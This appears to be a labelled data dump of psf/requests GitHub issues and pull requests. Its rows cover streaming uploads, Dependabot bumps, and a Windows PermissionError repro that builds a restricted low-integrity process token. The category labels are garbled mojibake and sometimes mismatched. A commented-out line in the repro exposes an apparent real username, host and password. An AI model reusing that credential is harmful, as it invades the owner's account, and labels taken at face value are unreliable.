- Just in case, I tried it different ways setting a header for Content-Type multipart/form-data, both with and without it [I had read that setting it yourself can mess up requests.] If I omitted it, it complained it was missing; and if I included it, I got the errors previously specified.

Is it possible to furnish a generator for multipart/form-data? If I have to, I will dump the stream into a file and pass a descriptor to the files argument; but seems that you would have furnished a way to use a generator since it is supported for Content-Type application/json
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",é«˜,https://github.com/psf/requests/issues/6826
2646870728,Remove old macOS runners,"Now that the upstream issue in setup-python is  resolved, we can move back to using `macos-latest` for everything.",Bugåé¦ˆ,é«˜,https://github.com/psf/requests/pull/6824
2645533839,chunked put using a generator function...,"<!-- Summary. -->
I made a generator function that returns str chunks; I passed it to data [...data=my_func()...], and it eventually comes back with the error ""memoryview: a bytes-like object is required, not 'str'"" (debug statements indicate this is happening on the first yield...)

Documentation indicates this is the way to do it: [https://docs.python-requests.org/en/latest/user/advanced/#chunk-encoded-requests](https://docs.python-requests.org/en/latest/user/advanced/#chunk-encoded-requests)

## Expected Result

<!-- What you expected. -->
No error!

## Actual Result

<!-- What happened instead. -->
The error ""memoryview: a bytes-like object is required, not 'str'"".
## Reproduction Steps

```python
import requests

def test():
    json_preamble='{""field"": ""value"",'
    def put()->str:
        yield json_preamble

        return '""field2"": ""value2""}' # final chunk...

    response=requests.put(some_url, data=put(), headers=some_headers)

test ()
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.1.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.0.1""
  },
  ""cryptography"": {
    ""version"": ""38.0.4""
  },
  ""idna"": {
    ""version"": ""3.3""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.2""
  },
  ""platform"": {
    ""release"": ""6.1.0-26-amd64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30000080"",
    ""version"": ""23.0.0""
  },
  ""requests"": {
    ""version"": ""2.28.1""
  },
  ""system_ssl"": {
    ""version"": ""300000e0""
  },
  ""urllib3"": {
    ""version"": ""1.26.12""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": true
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6823
2644394245,Add HTTP status group properties for response objects,"## PR Description:

This PR adds properties (`is_2xx_successful`, `is_5xx_server_error`, etc.) to the HTTP response class for easy classification of HTTP status codes, improving code readability.

## Justification:
- **Improved readability**: Using direct range comparisons like `100 <= self.status_code < 200` makes the code clear and intuitive.
- **Maintaining performance**: The range comparison is efficient and keeps the performance trade-offs minimal while avoiding unnecessary complexity.
","Bugåé¦ˆ, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6822
2632082717,Alert autofix 1,,Bugåé¦ˆ,ä¸­,https://github.com/psf/requests/pull/6821
2630760253,Update vulnerability disclosure process,This PR will move our desired workflow for vulnerability reports to use GitHub's [Security Advisory](https://docs.github.com/en/code-security/getting-started/github-security-features#security-advisories) form. This will hopefully simplify the workflow for reporters by removing the disclosure signing steps and using a standardized UI for reviewing and communicating about in-progress advisories.,"åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6820
2622273505,Add !r to error messages for improved clarity on file paths,"If leading and/or trailing spaces are included in the file path, they are clearly shown in the error messages because the file path is shown within quotes. If the file path is not shown within quotes, it may be difficult to identify that leading and/or trailing spaces are the cause of the problem.",Bugåé¦ˆ,ä¸­,https://github.com/psf/requests/pull/6819
2618862774,Bump github/codeql-action from 3.26.0 to 3.27.0,"Bumps [github/codeql-action](https://github.com/github/codeql-action) from 3.26.0 to 3.27.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/releases"">github/codeql-action's releases</a>.</em></p>
<blockquote>
<h2>v3.27.0</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.27.0 - 22 Oct 2024</h2>
<ul>
<li>Bump the minimum CodeQL bundle version to 2.14.6. <a href=""https://redirect.github.com/github/codeql-action/pull/2549"">#2549</a></li>
<li>Fix an issue where the <code>upload-sarif</code> Action would fail with &quot;upload-sarif post-action step failed: Input required and not supplied: token&quot; when called in a composite Action that had a different set of inputs to the ones expected by the <code>upload-sarif</code> Action. <a href=""https://redirect.github.com/github/codeql-action/pull/2557"">#2557</a></li>
<li>Update default CodeQL bundle version to 2.19.2. <a href=""https://redirect.github.com/github/codeql-action/pull/2552"">#2552</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.27.0/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/blob/main/CHANGELOG.md"">github/codeql-action's changelog</a>.</em></p>
<blockquote>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>[UNRELEASED]</h2>
<p>No user facing changes.</p>
<h2>3.27.0 - 22 Oct 2024</h2>
<ul>
<li>Bump the minimum CodeQL bundle version to 2.14.6. <a href=""https://redirect.github.com/github/codeql-action/pull/2549"">#2549</a></li>
<li>Fix an issue where the <code>upload-sarif</code> Action would fail with &quot;upload-sarif post-action step failed: Input required and not supplied: token&quot; when called in a composite Action that had a different set of inputs to the ones expected by the <code>upload-sarif</code> Action. <a href=""https://redirect.github.com/github/codeql-action/pull/2557"">#2557</a></li>
<li>Update default CodeQL bundle version to 2.19.2. <a href=""https://redirect.github.com/github/codeql-action/pull/2552"">#2552</a></li>
</ul>
<h2>3.26.13 - 14 Oct 2024</h2>
<p>No user facing changes.</p>
<h2>3.26.12 - 07 Oct 2024</h2>
<ul>
<li>
<p><em>Upcoming breaking change</em>: Add a deprecation warning for customers using CodeQL version 2.14.5 and earlier. These versions of CodeQL were discontinued on 24 September 2024 alongside GitHub Enterprise Server 3.10, and will be unsupported by CodeQL Action versions 3.27.0 and later and versions 2.27.0 and later. <a href=""https://redirect.github.com/github/codeql-action/pull/2520"">#2520</a></p>
<ul>
<li>
<p>If you are using one of these versions, please update to CodeQL CLI version 2.14.6 or later. For instance, if you have specified a custom version of the CLI using the 'tools' input to the 'init' Action, you can remove this input to use the default version.</p>
</li>
<li>
<p>Alternatively, if you want to continue using a version of the CodeQL CLI between 2.13.5 and 2.14.5, you can replace <code>github/codeql-action/*@v3</code> by <code>github/codeql-action/*@v3.26.11</code> and <code>github/codeql-action/*@v2</code> by <code>github/codeql-action/*@v2.26.11</code> in your code scanning workflow to ensure you continue using this version of the CodeQL Action.</p>
</li>
</ul>
</li>
</ul>
<h2>3.26.11 - 03 Oct 2024</h2>
<ul>
<li>
<p><em>Upcoming breaking change</em>: Add support for using <code>actions/download-artifact@v4</code> to programmatically consume CodeQL Action debug artifacts.</p>
<p>Starting November 30, 2024, GitHub.com customers will <a href=""https://github.blog/changelog/2024-04-16-deprecation-notice-v3-of-the-artifact-actions/"">no longer be able to use <code>actions/download-artifact@v3</code></a>. Therefore, to avoid breakage, customers who programmatically download the CodeQL Action debug artifacts should set the <code>CODEQL_ACTION_ARTIFACT_V4_UPGRADE</code> environment variable to <code>true</code> and bump <code>actions/download-artifact@v3</code> to <code>actions/download-artifact@v4</code> in their workflows. The CodeQL Action will enable this behavior by default in early November and workflows that have not yet bumped to <code>actions/download-artifact@v3</code> to <code>actions/download-artifact@v4</code> will begin failing then.</p>
<p>This change is currently unavailable for GitHub Enterprise Server customers, as <code>actions/upload-artifact@v4</code> and <code>actions/download-artifact@v4</code> are not yet compatible with GHES.</p>
</li>
<li>
<p>Update default CodeQL bundle version to 2.19.1. <a href=""https://redirect.github.com/github/codeql-action/pull/2519"">#2519</a></p>
</li>
</ul>
<h2>3.26.10 - 30 Sep 2024</h2>
<ul>
<li>We are rolling out a feature in September/October 2024 that sets up CodeQL using a bundle compressed with <a href=""http://facebook.github.io/zstd/"">Zstandard</a>. Our aim is to improve the performance of setting up CodeQL. <a href=""https://redirect.github.com/github/codeql-action/pull/2502"">#2502</a></li>
</ul>
<h2>3.26.9 - 24 Sep 2024</h2>
<p>No user facing changes.</p>
<h2>3.26.8 - 19 Sep 2024</h2>
<ul>
<li>Update default CodeQL bundle version to 2.19.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2483"">#2483</a></li>
</ul>
<h2>3.26.7 - 13 Sep 2024</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/github/codeql-action/commit/662472033e021d55d94146f66f6058822b0b39fd""><code>6624720</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2561"">#2561</a> from github/update-v3.27.0-b35b023d9</li>
<li><a href=""https://github.com/github/codeql-action/commit/ce7c2b560da6747133b72eb2f33503a6c4da9c15""><code>ce7c2b5</code></a> Update changelog for v3.27.0</li>
<li><a href=""https://github.com/github/codeql-action/commit/b35b023d9b1296658ca1bcb95dcd0336f9d23f0b""><code>b35b023</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2552"">#2552</a> from github/update-bundle/codeql-bundle-v2.19.2</li>
<li><a href=""https://github.com/github/codeql-action/commit/dafc762411c1755f00abee84283eaa85d438af2e""><code>dafc762</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2560"">#2560</a> from github/aeisenberg/fix-required-checks</li>
<li><a href=""https://github.com/github/codeql-action/commit/0d1eb88b60733b6720210d591c48ebc9e961d42c""><code>0d1eb88</code></a> Remove ESLint from required checks</li>
<li><a href=""https://github.com/github/codeql-action/commit/0a30541440699f21b772e5ef95c912f097514855""><code>0a30541</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2558"">#2558</a> from github/dependabot/npm_and_yarn/npm-6515e6e328</li>
<li><a href=""https://github.com/github/codeql-action/commit/2a6a6ad1c809216132b8a6a8c1f5873fff3f400a""><code>2a6a6ad</code></a> Update checked-in dependencies</li>
<li><a href=""https://github.com/github/codeql-action/commit/26c18c2c1f382ccd402aec5dd18d9ff6d0097891""><code>26c18c2</code></a> Bump the npm group with 3 updates</li>
<li><a href=""https://github.com/github/codeql-action/commit/7080a68cbca9319f3cf869f12f34acea853ad72d""><code>7080a68</code></a> Merge branch 'main' into update-bundle/codeql-bundle-v2.19.2</li>
<li><a href=""https://github.com/github/codeql-action/commit/63eb7bbf1f65c025536b3e7d083d89c1c161043c""><code>63eb7bb</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2551"">#2551</a> from github/cklin/diff-informed-queries-feature</li>
<li>Additional commits viewable in <a href=""https://github.com/github/codeql-action/compare/eb055d739abdc2e8de2e5f4ba1a8b246daa779aa...662472033e021d55d94146f66f6058822b0b39fd"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=github/codeql-action&package-manager=github_actions&previous-version=3.26.0&new-version=3.27.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",ä½,https://github.com/psf/requests/pull/6818
2618862456,Bump actions/setup-python from 5.2.0 to 5.3.0,"Bumps [actions/setup-python](https://github.com/actions/setup-python) from 5.2.0 to 5.3.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/setup-python/releases"">actions/setup-python's releases</a>.</em></p>
<blockquote>
<h2>v5.3.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Add workflow file for publishing releases to immutable action package by <a href=""https://github.com/Jcambass""><code>@â€‹Jcambass</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/941"">actions/setup-python#941</a></li>
<li>Upgrade IA publish by <a href=""https://github.com/Jcambass""><code>@â€‹Jcambass</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/943"">actions/setup-python#943</a></li>
</ul>
<h3>Bug Fixes:</h3>
<ul>
<li>Normalise Line Endings to Ensure Cross-Platform Consistency by <a href=""https://github.com/priya-kinthali""><code>@â€‹priya-kinthali</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/938"">actions/setup-python#938</a></li>
<li>Revise <code>isGhes</code> logic by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/963"">actions/setup-python#963</a></li>
<li>Bump pillow from 7.2 to 10.2.0 by <a href=""https://github.com/aparnajyothi-y""><code>@â€‹aparnajyothi-y</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/956"">actions/setup-python#956</a></li>
</ul>
<h3>Enhancements:</h3>
<ul>
<li>Enhance workflows and documentation updates by <a href=""https://github.com/priya-kinthali""><code>@â€‹priya-kinthali</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/965"">actions/setup-python#965</a></li>
<li>Bump default versions to latest by <a href=""https://github.com/jeffwidman""><code>@â€‹jeffwidman</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/905"">actions/setup-python#905</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/Jcambass""><code>@â€‹Jcambass</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/setup-python/pull/941"">actions/setup-python#941</a></li>
<li><a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/setup-python/pull/963"">actions/setup-python#963</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/setup-python/compare/v5...v5.3.0"">https://github.com/actions/setup-python/compare/v5...v5.3.0</a></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/setup-python/commit/0b93645e9fea7318ecaed2b359559ac225c90a2b""><code>0b93645</code></a> Enhance workflows: Add macOS 13 support, upgrade publish-action, and update d...</li>
<li><a href=""https://github.com/actions/setup-python/commit/9c76e716502b18322365741b762fee22a8cffad8""><code>9c76e71</code></a> Bump pillow from 7.2 to 10.2.0 in /<strong>tests</strong>/data  (<a href=""https://redirect.github.com/actions/setup-python/issues/956"">#956</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/f4c5a1183d69690d31b6304b7af403a5b56a88d6""><code>f4c5a11</code></a> Revise <code>isGhes</code> logic (<a href=""https://redirect.github.com/actions/setup-python/issues/963"">#963</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/19dfb7b659fa9e60c2f89c33335ab5f6f1792b6e""><code>19dfb7b</code></a> Bump default versions to latest (<a href=""https://redirect.github.com/actions/setup-python/issues/905"">#905</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/e9675cc634901ff55d92c575ecd6945e65464b00""><code>e9675cc</code></a> Merge pull request <a href=""https://redirect.github.com/actions/setup-python/issues/943"">#943</a> from actions/Jcambass-patch-1</li>
<li><a href=""https://github.com/actions/setup-python/commit/3226af69c08a4851edf81cffc8849d2db148b21f""><code>3226af6</code></a> Upgrade IA publish</li>
<li><a href=""https://github.com/actions/setup-python/commit/70dcb22d269dc9546a5d97f4b11548f130526421""><code>70dcb22</code></a> Merge pull request <a href=""https://redirect.github.com/actions/setup-python/issues/941"">#941</a> from actions/Jcambass-patch-1</li>
<li><a href=""https://github.com/actions/setup-python/commit/65b48c71155ac3186106d8d8de14787f5914b8d1""><code>65b48c7</code></a> Create publish-immutable-actions.yml</li>
<li><a href=""https://github.com/actions/setup-python/commit/29a37be0a3d3e8bf5bc1eb19cd0502922f5b312a""><code>29a37be</code></a> initial commit (<a href=""https://redirect.github.com/actions/setup-python/issues/938"">#938</a>)</li>
<li>See full diff in <a href=""https://github.com/actions/setup-python/compare/f677139bbe7f9c59b41e40162b753c062f5d49a3...0b93645e9fea7318ecaed2b359559ac225c90a2b"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/setup-python&package-manager=github_actions&previous-version=5.2.0&new-version=5.3.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6817
2617295858,Refactor and optimize codebase,"Add new tests for `HTTPAdapter` and hooks.

* **tests/test_adapters.py**
  - Add `test_http_adapter_send` to test the `send` method of `HTTPAdapter`.
  - Add `test_http_adapter_cert_verify` to test the `cert_verify` method of `HTTPAdapter`.

* **tests/test_hooks.py**
  - Add `test_hooks_with_multiple_hooks` to test hooks with multiple functions.
  - Add `test_hooks_with_no_hooks` to test hooks with no functions.

---

For more details, open the [Copilot Workspace session](https://copilot-workspace.githubnext.com/akaday/requests?shareId=XXXX-XXXX-XXXX-XXXX).",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6816
2615368736,Handle PermissionError when importing adapter.py,"In Windows, if the running process has restricted permissions the process may not have permission to read the file ""C:\\Users\\User\\Documents\\syskeylog.txt"". Sounds silly, but this error can propagate through dependencies and prevent them from complete importing, even if the functionality you expect from them do not depend on this project.



## Expected Result

Can import adapter.py

## Actual Result
```
    from pypac.parser import PACFile
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\pypac\__init__.py"", line 20, in <module>
    from pypac.api import (
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\pypac\api.py"", line 7, in <module>
    import requests
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\__init__.py"", line 164, in <module>
    from .api import delete, get, head, options, patch, post, put, request
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\api.py"", line 11, in <module>
    from . import sessions
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\sessions.py"", line 15, in <module>
    from .adapters import HTTPAdapter
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\requests\adapters.py"", line 80, in <module>
    _preloaded_ssl_context = create_urllib3_context()
                             ^^^^^^^^^^^^^^^^^^^^^^^^
  File ""C:\Users\User\python_venvs\companion_app312\Lib\site-packages\urllib3\util\ssl_.py"", line 349, in create_urllib3_context
    context.keylog_filename = sslkeylogfile
    ^^^^^^^^^^^^^^^^^^^^^^^
PermissionError: [Errno 13] Permission denied: 'C:\\Users\\User\\Documents\\syskeylog.txt'
```

## Reproduction Steps


Run the following code in Windows. You gotta remove a line and un-indent a block. See comment within the code.

```
import _winapi
import asyncio
import ctypes
import msvcrt
import os
import socket
import subprocess
import sys
import time
import traceback
import winreg
from ctypes import wintypes
from multiprocessing import spawn
from subprocess import Popen

import win32api
import win32con
import win32security
from _ctypes import byref, sizeof


def check_privilege():
    # Get the current process token
    token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)

    # Retrieve the privileges
    privileges = win32security.GetTokenInformation(token, win32security.TokenPrivileges)
    elevation = win32security.GetTokenInformation(token, win32security.TokenElevation)
    print(elevation)
    # Check if the required privilege is present
    for privilege in privileges:
        print(f""{win32security.LookupPrivilegeName(None, privilege[0])} - {privilege[1]}"", file=sys.stderr)
    return False


def check_groups():
    token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)

    groups = win32security.GetTokenInformation(token, win32security.TokenGroups)

    for group, enabled in groups:
        name = win32security.LookupAccountSid(None, group)
        print(f""{group} - {name} - {hex(enabled)}"", file=sys.stderr)


def _get_token():
    # h_token = win32security.LogonUser(
    #     ""nopriv"",
    #     ""VAN-917843-PC3"",
    #     ""Stillcreekdr123!"",
    #     win32con.LOGON32_LOGON_INTERACTIVE,
    #     win32con.LOGON32_PROVIDER_DEFAULT
    # )

    # gid = _get_fnbi_group()
    # _add_fnbi_group_user()

    system_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                                  win32con.TOKEN_DUPLICATE
                                                  | win32con.TOKEN_ADJUST_DEFAULT
                                                  | win32con.TOKEN_ADJUST_PRIVILEGES
                                                  | win32con.TOKEN_QUERY
                                                  | win32con.TOKEN_ASSIGN_PRIMARY
                                                  | win32con.TOKEN_ADJUST_GROUPS)
    low_integrity_SID = ""S-1-16-4096""
    # https://learn.microsoft.com/en-ca/windows/win32/api/securitybaseapi/nf-securitybaseapi-createrestrictedtoken
    # BOOL CreateRestrictedToken(
    #   [in]           HANDLE               ExistingTokenHandle,
    #   [in]           DWORD                Flags,
    #   [in]           DWORD                DisableSidCount,
    #   [in, optional] PSID_AND_ATTRIBUTES  SidsToDisable,
    #   [in]           DWORD                DeletePrivilegeCount,
    #   [in, optional] PLUID_AND_ATTRIBUTES PrivilegesToDelete,
    #   [in]           DWORD                RestrictedSidCount,
    #   [in, optional] PSID_AND_ATTRIBUTES  SidsToRestrict,
    #   [out]          PHANDLE              NewTokenHandle
    # );

    old_groups = win32security.GetTokenInformation(system_token, win32security.TokenGroups)
    disabled_sids = []
    restricted_sids = []
    enabled_masks = {
        ""S-1-1-0"", # everyone
        ""S-1-5-32-545"", # Users - needed for dev only?
        ""S-1-5-5"", # logon session - dev only
    }
    restricted_masks = {

    }

    def mask_match(entry: str, mask_set):
        for m in mask_set:
            if entry.startswith(m):
                return True
        return False

    for g, state in old_groups:
        sid_str = str(g).split("":"")[1]

        if mask_match(sid_str, restricted_masks):
            restricted_sids.append((g, 0))
            continue

        if mask_match(sid_str, enabled_masks):
            continue

        disabled_sids.append((g, 0))

    restricted_token = win32security.CreateRestrictedToken(
        system_token,
        win32security.DISABLE_MAX_PRIVILEGE,  # flags
        # None,
        disabled_sids,  # denied SIDS
        None,  # privs to delete
        restricted_sids  # restricted SIDS
    )

    til = (win32security.CreateWellKnownSid(win32security.WinLowLabelSid), win32security.SE_GROUP_INTEGRITY)
    win32security.SetTokenInformation(restricted_token, win32security.TokenIntegrityLevel, til)

    return restricted_token


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        (""cb"", wintypes.DWORD),  # Size of the structure
        (""lpReserved"", wintypes.LPWSTR),  # Reserved; must be NULL
        (""lpDesktop"", wintypes.LPWSTR),  # Name of the desktop
        (""lpTitle"", wintypes.LPWSTR),  # Title of the window
        (""dwX"", wintypes.DWORD),  # X position
        (""dwY"", wintypes.DWORD),  # Y position
        (""dwXSize"", wintypes.DWORD),  # Width of the window
        (""dwYSize"", wintypes.DWORD),  # Height of the window
        (""dwXCountChars"", wintypes.DWORD),  # Height of the window
        (""dwYCountChars"", wintypes.DWORD),  # Height of the window
        (""dwFillAttribute"", wintypes.DWORD),  # Height of the window
        (""dwFlags"", wintypes.DWORD),  # Flags
        (""wShowWindow"", wintypes.WORD),  # Show window command
        (""cbReserved2"", wintypes.WORD),  # Size of the reserved area
        (""lpReserved2"", wintypes.LPBYTE),  # Pointer to the reserved area
        (""hStdInput"", wintypes.HANDLE),  # Handle to standard input
        (""hStdOutput"", wintypes.HANDLE),  # Handle to standard output
        (""hStdError"", wintypes.HANDLE)  # Handle to standard error
    ]


class STARTUPINFOEX(ctypes.Structure):
    _fields_ = [
        (""StartupInfo"", STARTUPINFO),
        (""lpAttributeList"", wintypes.LPVOID)
    ]


# Define PROCESS_INFORMATION structure
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        (""hProcess"", wintypes.HANDLE),
        (""hThread"", wintypes.HANDLE),
        (""dwProcessId"", wintypes.DWORD),
        (""dwThreadId"", wintypes.DWORD)
    ]


# Load the function
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
libc = ctypes.CDLL(""msvcrt.dll"")

# Define SetHandleInformation function
SetHandleInformation = kernel32.SetHandleInformation
SetHandleInformation.argtypes = [
    ctypes.wintypes.HANDLE,  # hObject
    ctypes.wintypes.DWORD,  # dwMask
    ctypes.wintypes.DWORD  # dwFlags
]
SetHandleInformation.restype = ctypes.wintypes.BOOL

CreateProcessW = kernel32.CreateProcessW
CreateProcessAsUser = advapi32.CreateProcessAsUserW
CREATE_UNICODE_ENVIRONMENT = 0x00000400
PROC_THREAD_ATTRIBUTE_LIST = 0x00020000
PROC_THREAD_ATTRIBUTE_HANDLE_LIST = 0x00020004
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
HANDLE_FLAG_INHERIT = 0x00000001
HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002


def get_last_error_message():
    error_code = ctypes.get_last_error()
    if error_code == 0:
        return ""No error.""

    message_buffer = ctypes.create_string_buffer(256)
    message_length = kernel32.FormatMessageA(
        0x00000001 | 0x00001000,  # FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER
        None,
        error_code,
        0,
        byref(message_buffer),
        ctypes.sizeof(message_buffer),
        None
    )

    if message_length == 0:
        return f""Unknown error code: {error_code}""
    msg = message_buffer.value.decode('ansi').replace('\r', '').replace('\n', '')
    return msg


foo = None


# Function to get Windows handle from file descriptor
def get_windows_handle(file):
    # Get the file descriptor
    fd = file.fileno()

    # Use _get_osfhandle to get the Windows handle
    handle = ctypes.windll.kernel32._get_osfhandle(fd)

    if handle == -1:
        raise ValueError(""Could not get the Windows handle."")

    return handle


def make_handle_inheritable(handle):
    if not SetHandleInformation(handle, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT):
        raise ctypes.WinError(ctypes.get_last_error())


def writer_main():
    def CreateProcess(cmd, cmdline, proc_attr, thread_attr, inherit_handles, creation_flags, current_directory,
                      environment, startup_info):
        # change_privilege(win32con.SE_PRIVILEGE_ENABLED)
        # check_privilege()

        token = _get_token()
        # CreateProcessAsUser
        #   0 [in, optional]      HANDLE                hToken,
        #   1 [in, optional]      LPCSTR                lpApplicationName,
        #   2 [in, out, optional] LPSTR                 lpCommandLine,
        #   3 [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        #   4 [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        #   5 [in]                BOOL                  bInheritHandles,
        #   6 [in]                DWORD                 dwCreationFlags,
        #   7 [in, optional]      LPVOID                lpEnvironment,
        #   8 [in, optional]      LPCSTR                lpCurrentDirectory,
        #   9 [in]                LPSTARTUPINFOA        lpStartupInfo,

        # CreateProcess
        #   0 [in, optional]      LPCSTR                lpApplicationName,
